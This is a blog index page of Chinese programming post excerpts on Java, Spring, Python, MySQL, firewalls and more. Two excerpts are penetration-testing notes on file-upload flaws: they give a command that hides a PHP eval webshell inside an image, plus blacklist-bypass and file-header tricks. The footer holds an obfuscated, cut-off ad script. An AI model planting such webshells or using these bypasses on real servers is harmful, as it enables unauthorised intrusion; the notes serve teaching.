public class Test{ public static void main(String [] args){ java.util.Data data = new java.util.Data(); //得到一个毫秒级别的时间戳 System.out.println(data.getTime()); } } 也可以用import语句导入包
import java.util.Data; public class Test{ public static void main(String [] args){ java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e17ed53ab6aca0119465a27bcdbe09f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74646bd8aeccc8e2b9efa03e6ee86aa2/" rel="bookmark">
			AES linux 加密失败的原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上周在工作中遇到了一个AES加密的问题, 使用我自己封装的一个AES 加密的工具类 在本地Windows环境下运行一切正常 , 但是发布到liunx上就出现了异常, 异常信息如下, 原因就是因为系统这个类在不同的系统环境下调用的代码不用 (唉呀 这个好坑啊) 这里整理一下
Exception in thread "main" java.lang.RuntimeException: Given final block not properly padded. Such issues can arise if a bad key is used during decryption. at AesUtils.decrypt(AesUtils.java:116) at AesUtils.decrypt(AesUtils.java:49) at AesUtils.main(AesUtils.java:27) Caused by: javax.crypto.BadPaddingException: Given final block not properly padded. Such issues can arise if a bad key is used during decryption. at com.sun.crypto.provider.CipherCore.doFinal(CipherCore.java:991) at com.sun.crypto.provider.CipherCore.doFinal(CipherCore.java:847) at com.sun.crypto.provider.AESCipher.engineDoFinal(AESCipher.java:446) at javax.crypto.Cipher.doFinal(Cipher.java:2164) at AesUtils.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74646bd8aeccc8e2b9efa03e6ee86aa2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0806cc6d2b94ed665b69320d87210fe4/" rel="bookmark">
			【Idea 2020.1】Mybatis-plus执行insert语句，执行一次数据库出现两条一模一样的数据解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		执行如下插入代码，观察数据库输出
好家伙，数据库直接给你整出来两条一模一样的数据
看了很多网上教程，都说就是将Delegate IDE build/run actions to Maven （翻译意思是：将IDE构建/运行操作委托给maven）前面的勾勾取消。
接下来运行程序，又出现了问题
这可能就是idea2020.1与其他版本的特性吧，ok，我们看一下如何解决，也很简单。
接下来我们删除刚才插入的两条数据再次运行查看结果。
ok，问题已经解决，有相同经历的小伙伴记得点个赞支持一下哦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dee10ff3149d96859a459c8c40d364c/" rel="bookmark">
			Python语句块，流程图，分支结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：语句块 语句块是指成块的代码，通常由若干行组成（也有的只有单条语句的语句块），和块外的代码处于不同的层次关系。
Python使用行首的缩进来标明语句块。Python 解释器没有限制在每一级缩进使用几个空格，只要同一个代码块中所有行的缩进距离相同即可。约定俗成的是使用 4 个空格来定义一级缩进，如果有两级缩进，那就是 8 个空格，以此类推。在严格要求的代码缩进之下，Python 代码非常整齐规范,提高了可读性，在一定程度上也提高了可维护性。
不建议使用制表符（即使用 Tab 键）来缩进。各个平台制表符缩进距离不同。如Windows 的制表符的宽度是 8，而 Linux 的制表符的宽度是 4。但现在的 IDE 和一些具有很多新特性的文本编辑器支持 py 源代码文件格式的各种特性，这包括将制表符自动地转换为 4 个空格，在这种特性的支持下，可以使用 Tab 键。
定义语句块的规律：
1.定义语句块的语句需要以冒号结束，它表示从下一行开始需要增加一级缩进。
2.在语句块中进一步定义一个新的语句块时，就需要第二级缩进，以此类推。
3.在语句块中减少缩进量时，表示当前语句块已经结束，后续的行将回退到上一层。
二：流程图 圆角矩形表示“开始”与“结束”
菱形表示问题判断或选择环节
箭头代表工作流方向
矩形表示处理步骤
平行四边形表示输入/输出
如下图
三：分支结构 Python 用 if 语句实现分支结构
1.单条件分支结构
分支结构有两大类
第一种是最简单的 if 句型，即单条件分支：如果条件成立，做特定的处理，否则什么也不做，直接执行后续代码。
例：比较大小
a = 2;b = 3 a1 = "A大！" b1 = "B大！" if b &gt; a: print(b1) 第二种是 if…else…句型，其仍然只有单个条件，但稍微复杂一些，要求条件成立的时候做一种特定的处理，而条件不成立则要做另一种处理。
例：比较大小
a = 4;b = 3 a1 = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4dee10ff3149d96859a459c8c40d364c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15ebdc7790fd4e67f6b8733a50755b94/" rel="bookmark">
			华为防火墙
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		aspf（防火墙双通道） 主要用于ftp主动模式，当ftp处于主动模式时，来回的端口号是不同的，由双方服务器协商产生，这时候就需要双通道将协商的端口号告知防火墙。
QQ的文字流量与语音流量有不同的传输通道，这时也需要双通道。
配置：
r1：trust
r2：untrust
首先在r2上开启ftp服务
aaa local-user 123 password cipher 123 local-user 123 privilege level 15 local-user 123 ftp-directory flash: local-user 123 service-type ftp local-user admin password cipher 123 local-user admin service-type http 在防火墙上设置策略：
security-policy rule name 1 source-zone trust destination-zone local destination-zone untrust service ftp service icmp action permit 在防火墙上将区域划入接口：
firewall zone trust set priority 85 add interface GigabitEthernet1/0/0 firewall zone untrust set priority 5 add interface GigabitEthernet1/0/1 设置静态路由后就可以开始ftp：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15ebdc7790fd4e67f6b8733a50755b94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22f694b156507d6aeb1594bbf3f52ea3/" rel="bookmark">
			java的锁，synchronized 关键字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java的锁，synchronized 关键字 1.synchronized 锁 ​ 锁又是线程中的一个概念，两个或者多个线程，可以通过锁来控制多个线程的执行。 换句话说，多个线程竞争同一把锁，拿到锁的线程，先运行。其他没拿到锁的线程，等待，知道拿到锁，然后才能执行。 上面的理解可以参考下面的代码：
public class TestSynchronized { public static void main(String[] args) { new TestSynchronized().testSynchronized(); } public void testSynchronized(){ Object lock = new Object(); //这是一个锁 Thread threadA = new Thread(()-&gt;{ synchronized (lock){ //锁住lock for (int i = 0; i &lt; 3; i++) { System.out.println("Current Thread "+Thread.currentThread().getName()+" running"); } } },"A"); Thread threadB = new Thread(()-&gt;{ synchronized (lock){ //锁住lock for (int i = 0; i &lt; 3; i++) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22f694b156507d6aeb1594bbf3f52ea3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1453c643c5e7e62e36825b60e861e18/" rel="bookmark">
			【Java】join方法实现原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.概述 join() 的作用是让别的线程在自己之前执行
假设线程A必须要在线程B之后执行，则可以在线程A中调用B.join()，则线程A将一直等待/阻塞，直到线程B运行完。
二.源码 简化版的源码如下：
public final synchronized void join(final long millis) throws InterruptedException{ while (isAlive()) { wait(0); } } 首先一个很直观的感受是，join() 实质是通过wait() 来实现的。假设A进程中调用了B进程的join()方法，由于join是synchronized方法，所以A进程获取了B进程的锁。随后调用了wait方法，从而自身陷入无限期等待。
当一个线程执行完时，系统会调用它的exit()方法，并在其中执行notifyAll()。所以当线程B运行完的时候会唤醒线程A。
while(isAlive())的作用：
isAlive()是一个native方法，它可以判断一个线程是否活着：
假如一个线程被new出来，但还没有通过start()方法启动则不算活着当一个线程执行完时，自然就不算活着了 因此while(isAlive())是为了保证只在线程B“启动且没终止”的情况下才执行wait()方法，如果直接执行wait()方法，假如线程B一直没被启动则A也将无限期地等下去。
为什么不用 if 而是 while 来判断，因为不能只判断一次，而是要一直判断直到B进程启动。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2ffec79d876a0446093e674e3cdb0b8/" rel="bookmark">
			Spring注入Bean为null
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一个问题 Spring注入Bean为null
原因:
项目多人开发一位同事写的controller 是private 的 而我 写一个一个接口加上了 @Transactional(rollbackFor = Exception.class) 注解 事务 使用了 Spring 在创建这个bean 是 代理失败了
就从一级缓存中取出Bean 注入了 所以 注入的Bean 都未null
这是个奇怪的问题 , 再次强调一下还是要规范开发啊 ! Controller接口 最好不要私有!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb7399ac0769b25244808e1550053094/" rel="bookmark">
			Unity 通过对象池实现滑动列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背包格子类
挂载在格子的预制体上，用于创建该格子时更新该物品的数量等信息
using System.Collections; using System.Collections.Generic; using UnityEngine; using UnityEngine.UI; public class BagItem : MonoBehaviour { public void InitItemInfo(Item info) { //更新道具数量 GetComponentInChildren&lt;Text&gt;().text = info.num.ToString(); } } 背包管理器
包含物品类，物品列表，以及创建演示数据的函数
using System.Collections.Generic; public class Item { public int id; public int num; } public class BagManager: Singleton&lt;BagManager&gt; { public List&lt;Item&gt; items = new List&lt;Item&gt;(); public void InitItemsInfo() { for(int i = 1; i &lt;= 100; i++) { Item item = new Item(); item.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb7399ac0769b25244808e1550053094/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0c448c61aad1bb337e8a8641a901863/" rel="bookmark">
			将Jetson XavierNX的Ubuntu系统迁移至到nvme固态硬盘上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 第一步：格式化分区
sudo mke2fs -t ext4 /dev/nvme0n1p1 #格式化分区 注意：这一步可能需要umount磁盘nvme0n1p1才能完成格式化。
第二步：将eMMC / SD卡的rootfs复制到SSD
在Home目录下：
git clone https://github.com/jetsonhacks/rootOnNVMe cd rootOnNVMe #进入目录 ./copy-rootfs-ssd.sh #执行复制脚本 注意：这里可能需要修改该脚本的内容，比如nvme0n1p1修改为nvme0n1p4，具体要根据df -h来查看。
第三步：安装启动脚本：将rootfs设置为NVME
./setup-service.sh #将rootfs设置为NVME sudo reboot #重启 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/041e7860d4eb09b39b4e2c3e2def8a48/" rel="bookmark">
			gin框架36--静态资源嵌入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		gin框架36--静态资源嵌入 介绍案例说明 介绍 本文主要介绍gin框架中如何使用静态资源嵌入。
案例 源码：
vim main.go package main import ( "html/template" "io/ioutil" "net/http" "strings" "github.com/gin-gonic/gin" ) func main() { r := gin.New() t, err := loadTemplate() if err != nil { panic(err) } r.SetHTMLTemplate(t) r.GET("/", func(c *gin.Context) { c.HTML(http.StatusOK, "/html/index.tmpl", gin.H{ "Foo": "World", }) }) r.GET("/bar", func(c *gin.Context) { c.HTML(http.StatusOK, "/html/bar.tmpl", gin.H{ "Bar": "World", }) }) r.Run(":8080") } func loadTemplate() (*template.Template, error) { t := template.New("") for name, file := range Assets.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/041e7860d4eb09b39b4e2c3e2def8a48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/678000a0f19222265691838067e98c30/" rel="bookmark">
			spring注解的理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@configuration及@bean 我们可以换一个角度来理解@Configuration与@Bean这两个注解，使用@Configuration注解修饰的类，我们可以把它看 作一个Spring的XML配置文件，而在类里面使用@Bean修饰的方法，则可以被看作XML文件中的一个&lt;bean&gt;元素。还有 一个细节需要注意，使用@Configuration注解修饰的类，本身也会作为一个bean被注册。 @scope注解 用于标注该bean在容器中是以单例存在，还是每次返回一个新的实例
@Scope注解的value属性，除了可以取值为“singleton”和“prototype”外，还可以设置为“request”“session”“application”和“websocket”，这些值都需要在Web环境中使用，在此不展开讨论。
@requestMapping属性配置 @RequestMapping配置访问前缀为“/oa”，如果要请求“hello”方法，则访问路径：http://localhost:8080/oa/hello。RequestMapping注解主要有以下属性。[插图] path与value：两个属性互为别名，用于配置映射的URI。在配置RequestMapping时，如果不设置属性名（如RequestMapping(“hello”)），则等同于配置了path属性。[插图] method：映射的HTTP方法，例如GET、POST、PUT、DELETE等。[插图] params：为映射的请求配置参数标识，例如配置为“params =‘action=save’”，则要通过“http://localhost:port/hello?action=save”访问该映射的方法。在表单中，可以为表单提交按钮设置name属性，例如，则表单会被提交到params值为add的方法。[插图] consumes：配置请求的数据类型，可配置为XML或JSON等数据格式。[插图] produces：配置响应的数据类型，例如配置为“application/json”，则表示返回JSON数据。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89602f525974ee73be5c76087893aa7b/" rel="bookmark">
			螺旋队列公式解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以1为坐标零点，向右为X正，向下为Y正，任意输入一坐标（x,y)，r=max(|x|,|y|) 为当前所在层数，得到下面公式
上边：top=max−r+x;
左边：left=max−3∗r−y;
下边：bottom=max−5∗r−x;
右边：right=max−7∗r+y;
（设：紫色数字为基准点1，上/下/左/右正对数值为基准点2，如红框数值）
一、第R层数值是从多少开始的？
首先可以知道第R-1层数值是 [2x(R-1)+1]^2 = (2xR-1)^2 加一就是下一层的第一个数值。eg:第四层是从 （2x4-1)^2+1=50 开始
二、第R层有多少个数？
第R层最大数为（2xR+1)^2，最小数为(2xR-1)^2+1，两式相减在加一即得到当前层数数值个数：8R，除第一层外，每一层都是8的倍数。eg:第五层有5x8=40个
三、如何通过坐标找数值？
1、首先确定层数，找到基准点1 ，图中紫色部分，此数值为当前层数最大数值。eg:第三层的49
2、第二部找到基准点2，当前层数的上、下、左、右 正对数值（真正只需一个），通过基准点2 与 x/y 进行 加/减 ，就得到坐标点（x,y)的数值。eg:如坐标（x,y)为（-2,-3)，先找到基准点2：49-1x3=46，在46基础上在加上x坐标-2得 46+（-2）=44
基准点2的获得就是通过当前层数最大值减去适当层数（层数可以类似看作半径），
每一层所有数值可以看作一个正方形，每条边的长度=层数X2+1，
从基准点1逆时针走过 1个层数为正上基准点2，走过3个层数为正左基准点2，走过5个层数为正下基准点2，走过7个层数为正右基准点2
参考资料：螺旋矩阵与螺旋队列
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9f64325202f2588e9f83822d5c15844/" rel="bookmark">
			MySQL基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		day01_数据库基础 课前回顾: 1.Junit单元测试,可以单独执行一个方法去测试 2.@Test @Before @After 3.类加载器:负责将class文件加载到内存 BootStrapClassLoader:核心类 ExtClassLoader:扩展类 AppClassLoader:自定义类和第三方jar包 4.类加载器机制:双亲委派 缓存机制 一个类只加载一次 5.类的加载时机: a.new对象 b.new子类 c.执行main方法 d.调用静态成员 e.反射 6.反射: a.Class对象:jvm自动为加载到内存的class文件在堆中创建的对象 b.class类:描述Class对象的类就叫做Class类 7.使用: a.getConstructors:获取所有public的构造 b.getConstructor(参数类型的class对象):获取指定的public的构造 c.newinstance:创建对象 d.getDeclaredConstructors:获取所有的构造包括private e.getDeclaredConstructor(参数类型的class对象):获取指定的构造 f.setAccessible(true):解除私有权限 g.getMethods():获取所有public的方法 h.getMethod(方法名,参数class对象):获取指定的成员方法 8.注意: 将来开发,将配置文件放到resources目录下 用类加载器读取: 当前类.class.getClassLoader().getReourceAsStream("文件名") 9.注解: a.定义: public @interface 注解名{ 数据类型 属性名(), 数据类型 属性名() default 值; } b.使用: @注解名(属性名 = "属性值"....) c.注解解析: isAnnotationPresent(注解的class对象)-&gt; 判断指定位置上是否有指定的注解 getAnnotation(注解的class对象):获取指定的注解 10.元注解:管理注解的注解 @Target:控制自定义注解能放到什么位置上 @Retention:控制自定义注解的生命周期 今日重点: 1.会安装mysql服务端和客户端 2.会使用sql语句创建数据库,删除数据库 3.会使用sql语句创建表,删除表 4.会使用sql语句对表中的数据进行增,删,改,查 5.会在创建表的时候加约束 第一章.数据库介绍 1.数据库介绍 1.什么是数据库 存储数据的仓库 2.作用: 永久存数据-&gt;会将数据按照指定的格式存储,方便我们程序员直接对指定的数据进行增删改查 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9f64325202f2588e9f83822d5c15844/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afcff23322a6c980d410971853e2a4be/" rel="bookmark">
			计算机组成原理要点精炼（5）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一位乘除法的计算方法 目录
一位乘除法的计算方法
1. 原码一位乘法：
2.补码一位乘法：
3. 原码除法运算（不恢复余数法）
4.补码除法运算（加减交替法）
1. 原码一位乘法： 在计算时，我们可以结果划分成符号位部分和绝对值部分，在原码一位乘法中，符号位通过被乘数和乘数各自的符号位异或运算后得到，不直接加入运算。
而在绝对值运算的过程中，考虑到运算过程中绝对值可能大于一的情况，此时仍在运算过程中，不能算溢出，需要引入双符号位，以免丢失数据。
同时，我们可以把绝对值部分划分成高位部分积和低位部分积。（高位部分积初值为0，长度同被乘数，低位部分积初值为乘数）
计算过程：记被乘数的绝对值|x|，乘数为
观察低位部分积的最末位，若为"1",则此时高位部分积数值为0，加上被乘数绝对值|x|，若为"0",高位部分积数值加0，部分积（高位和低位）逻辑右移，低位部分积的最末位进入丢弃位此时低位部分积的最末位变成， 若为"1",则此时高位部分积数值为0，加上被乘数绝对值|x|，若为"0",高位部分积数值加0，部分积（高位和低位）逻辑右移，低位部分积的最末位进入丢弃位按之前两步的算法重复，直到原乘数各个数位都进入丢弃位，此时的高低位部分积的结果拼接起来就是最终的乘法结果的绝对值部分。只需要在加上之前算的符号位结果就是最终的原码一位乘法的结果。 在实现上，我们用A寄存器存储高位部分积，设置初值为0，B寄存器存储被乘数|x|的值，B中的数值在运算中是不会改变的，C寄存器用于存储低位部分积，初值为未开始原码定点一位乘法时的乘数。下图中乘数绝对值部分|y| = 1001 ，被乘数绝对值部分为|x| = 1011
2.补码一位乘法： 补码一位乘法和原码一位乘法不同，符号位不再是单独计算，而是整体参与运算，结果仍可以得到一个补码。一样是采用加减运算操作来计算补码乘积。
补码一位乘法除了像原码乘法一样，设置有高位部分积、低位部分积（也有些书上称乘数部分）和丢弃位以外，还在乘数的末尾增设了一个附加位（这个附加位其实就是上一轮丢弃位经过补码右移出来的那个数值），乘数的末尾可能是，那附加位就是，对高位部分积的操作都是看的
（，），使用，
结果为0时，高位部分积加0；结果为1时，高位部分积加被乘数的补码形式；结果为-1时，高位部分积加被乘数负数的补码形式根据结果操作过后，再进行补码右移 计算步骤：假设我们有 被乘数,，乘数为,
附加位初始值给赋0，高位部分积位数同采用双符号位的被乘数（在上面给出的假设被乘数,是一个符号位），赋0值，低位部分积初值为乘数数值。观察（，），使用根据不同的结果来确定不同的处理（方法如上述列表） 直到丢弃位的数据（不计附加位初始值给赋的0）在某次补码右移操作后恰好为原来的乘数，在此基础上进行一次 （，）的 判断，更新高位部分积，低位部分积不变，结果即为高低位部分积的拼接值。
总体上补码一位乘法进行了n次右移，n+1次累加操作
这是王道的视频讲解上截下来的计算过程：
3. 原码除法运算（不恢复余数法） 原码的不恢复余数除法，也即原码的加减交替除法。某种程度上，除法运算可以简单认为是“累加-左移”的组合，由于机器数的不一样，又可以划分为原码、补码除法。
需要求解的除法运算的商分为符号位和数值部分，和原码乘法一样，原码除法符号位不参与运算，对应的商的符号位取除数和被除数的符号位异或运算得到。在商的数值运算中，商根据当前余数的正负来决定上商值为"1"（对应正数）或"0"（对应负数）
商的数值部分的计算过程：
1. 先用被除数的值|x|减去除数的值|y|，实际上我们可以知道由得到的部分余数正负来决定上商的值，和后续的操作。
若部分余数为正，上商"0"，部分余数和商左移一位，再加上|y|的相反数的补码若部分余数为负，上商"1"，部分余数和商左移一位，再加上|y|的补码 2. 一直到第n+1次累加操作后，得到的部分余数做判断，若为正，此时的商即为所求数值；若为负数，需要加上|y|的补码得到的才是正确的余数。
3. 实际上原码除法的不恢复余数法从原码除法的恢复余数法改进过来，主要做了对部分余数为负数时直接左移加上除数的处理，其部分余数为正数时直接左移减去除数的处理和恢复余数法一样
这是王道的视频讲解上截下来的计算过程：
4.补码除法运算（加减交替法） 补码除法中，商的符号位加入运算，不像前面提到的原码除法一样单独执行异或操作。原码除法的第一步就是将被除数部分直接减去除数部分，通过得到的部分余数的正负来决定接下来上商，移位，加减处理，而补码除法第一步直接通过对比被除数和除数的符号位同号与否来决定被除数部分的补码数值是加上还是减去除数的补码。
当前的部分余数和除数的符号位做对比，
同号：减去除数的补码，上商为"1"异号：加上除数的补码，上商为"0"然后向左移位 计算步骤：
对比被除数的补码和除数的补码的符号位是否同号，若同号，被除数减去除数；若异号，被除数加上除数。得到的结果是最初的部分余数。接下来将当前部分余数部分的值和除数的补码比较同号与否，根据实际的结果符号位的异同来决定上商，左移，累加的操作，直到最后一次左移结束（n次左移，n+1次累加），按照末位恒置一法，最终上商为"1"即可。最终得到的商值也是一个补码 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adba6c296fe7265e0d3e3f07e41ac88f/" rel="bookmark">
			小迪渗透笔记：文件上传（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件上传（2） 1、后端绕过（1）图片马的制作（2）文件头检测（3）图像文件信息判断（4）逻辑安全（5）目录命名+数组接收（6）CVE漏洞 2、解析漏洞3、编辑器漏洞4、文件上传思路 1、后端绕过 代码问题漏洞
（1）图片马的制作 copy 1.png /b + shell.php /a webshell.jpg
直接在图片中插入（十六进制）webshell：&lt;?php @eval($_POST['x']);?&gt;
（2）文件头检测 一般用十六进制器修改（burpsuit抓包修改头文件）
JPEG (jpg)，文件头：FFD8FFE1 PNG (png)，文件头：89504E47 GIF (gif)，文件头：47494638 TIFF (tif)，文件头：49492A00 Windows Bitmap (bmp)，文件头：424D CAD (dwg)，文件头：41433130 Adobe Photoshop (psd)，文件头：38425053 Rich Text Format (rtf)，文件头：7B5C727466 XML (xml)，文件头：3C3F786D6C HTML (html)，文件头：68746D6C3E （3）图像文件信息判断 注意检测函数，配合文件包含漏洞执行
getimagesize()：图片信息获取 获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条错误信息
&lt;?php list($width, $height, $type, $attr) = getimagesize("runoob-logo.png"); echo "宽度为：" . $width; echo "高度为：" . $height; echo "类型为：" . $type; echo "属性：" . $attr; ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adba6c296fe7265e0d3e3f07e41ac88f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb67e7fd72607d2d2a1a5965f79e04e4/" rel="bookmark">
			小迪渗透笔记：文件上传（1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件上传（1） 1、概述2、常规文件上传地址获取3、文件上传基础4、黑名单绕过5、白名单绕过 1、概述 （1）什么是文件上传漏洞？
程序对文件的上传未作全面的限制，导致用户可以上传一些超越用户权限的文件，可以是木马，shell脚本，病毒等。
（2）危害
可以成为网站后门webshell获取权限
（3）漏洞的查找和判断
黑盒查找：扫描敏感文件获取上传地址；功能点测试；后台处的文件上传（后台权限不等于网站权限）
白盒查找：拿到网页源码后，通过代码分析是否有文件上传漏洞
判断：抓包或测试
注：文件上传类型的分析
2、常规文件上传地址获取 扫描网站敏感文件
工具：wwwscan、御剑、AWVS
搜索网站关键词site: URL upload
3、文件上传基础 （1）上传文件的格式不能混用，如果要求上传php文件，则一般不上传图片，因为要执行的话，要按照对应代码执行，除非有解析漏洞（搭建平台）
（2）文件上传的绕过：
抓包修改文件后缀（如果采用的全为js代码，在本地执行，没有用php接收可能抓不到包）；
修改前端代码（对文件格式的过滤代码，因为将前端代码本地保存，所以最后需要添加action访问到图片对应上传的地址）
知道网站的CMS可以直接搜索XXXCMS上传漏洞，这种第三方插件的漏洞测试与常规不一样
（3）文件上传验证：
后缀名：类型，文件头等
后缀名：黑名单，白名单
黑名单：明确不让上传的格式后缀（asp php jsp aspx cgi war）
白名单：明确可以上传的格式后缀（jpg png zip rar gif）
文件类型：MIME信息 媒体类型，用来表示文档、文件或字节流的性质和格式。
由类型/子类型组成（无空格，一般是小写，不敏感）
text image audio:音频 video:视频 application:二进制
burpsuit：Content-Type:image/jpeg
文件头：内容头信息 方法：查看源码，抓包修改信息
（5）常用函数
_FILES函数 $_FILES['myFile']['name'] :文件的原名称 $_FILES['myFile']['type'] :文件的MIME 类型 $_FILES['myFile']['size'] :已上传文件的大小，单位为字节 $_FILES['myFile']['tmp_name'] :文件被上传后在服务端储存的临时文件名，一般是系统默认 $_FILES['myFile']['error'] :该文件上传相关的错误代码 实例：$_FILES['upload_file'] name="upload_file"相同才能上传
&lt;?php $name=$_FILES['upload_file']['name']; echo $name; ?&gt; &lt;form enctype="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb67e7fd72607d2d2a1a5965f79e04e4/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/284/">«</a>
	<span class="pagination__item pagination__item--current">285/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/286/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 